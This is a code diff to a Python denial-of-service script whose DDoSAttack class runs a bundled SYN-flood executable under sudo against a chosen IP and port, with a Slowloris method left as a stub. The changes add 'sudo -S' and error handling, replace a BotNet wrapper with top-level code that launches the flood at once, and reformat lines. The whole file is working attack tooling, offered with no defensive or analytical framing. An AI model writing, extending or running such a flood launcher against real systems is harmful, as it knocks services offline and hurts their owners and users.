@@ -14,9 +14,7 @@ logging.basicConfig(
 
 
 class DDoSAttack:
-    def __init__(
-        self, target_ip, target_port, num_connections, attack_type="aSYNcrone"
-    ):
+    def __init__(self, target_ip, target_port, num_connections, attack_type="aSYNcrone"):
         self.target_ip = target_ip
         self.target_port = target_port
         self.num_connections = num_connections
@@ -39,11 +37,11 @@ class DDoSAttack:
             logging.error(f"Unknown attack type: {self.attack_type}")
 
     def aSYNcrone_attack(self):
-        if sys.platform == "darwin" and platform.machine() == "arm64":
+        if sys.platform == "darwin" and platform.machine() == "arm64": # noqa
             path_to_executable = os.path.join(
                 os.path.dirname(__file__), "aSYNcrone/aSYNcronemacARM"
             )
-        elif sys.platform == "darwin":
+        elif sys.platform == "darwin": # noqa
             path_to_executable = os.path.join(
                 os.path.dirname(__file__), "aSYNcrone/aSYNcronemac"
             )
@@ -57,13 +55,19 @@ class DDoSAttack:
         # aSYNcronemacARM <source port> <target IP> <target port> <threads number>
         command = [
             "sudo",
+            "-S",
             path_to_executable,
             "80",
             self.target_ip,
             str(self.target_port),
             str(self.num_connections),
         ]
-        subprocess.run(command, check=True)
+        try:
+            subprocess.run(command, check=True)
+        except subprocess.CalledProcessError as e:
+            logging.error(f"Error while running aSYNcrone: {e}")
+            return
+
 
     def slowloris_attack(self):
         # TODO: Implement the Slowloris attack here
@@ -74,33 +78,12 @@ class DDoSAttack:
             thread.join()
 
 
-class BotNet:
-    def __init__(
-        self, num_bots, target_ip, target_port, num_connections, attack_type="aSYNcrone"
-    ):
-        self.num_bots = num_bots
-        self.target_ip = target_ip
-        self.target_port = target_port
-        self.num_connections = num_connections
-        self.attack_type = attack_type
-        self.bots = []
+# Target parameters
+target_ip = "192.168.1.1"
+target_port = 80
+num_connections = 1
 
-    def create_bots(self):
-        for _ in range(self.num_bots):
-            bot = DDoSAttack(
-                self.target_ip, self.target_port, self.num_connections, self.attack_type
-            )
-            self.bots.append(bot)
-
-    def launch_attack(self):
-        for bot in self.bots:
-            bot.create_connection()
-        for bot in self.bots:
-            bot.wait_for_threads()
-
-
-botnet = BotNet(
-    1, "192.168.1.1", 80, 1, "aSYNcrone"
-)  # num of bots, target IP, target port, connections per bot
-botnet.create_bots()
-botnet.launch_attack()
+# Create and launch attack
+attack = DDoSAttack(target_ip, target_port, num_connections, "aSYNcrone")
+attack.create_connection()
+attack.wait_for_threads()
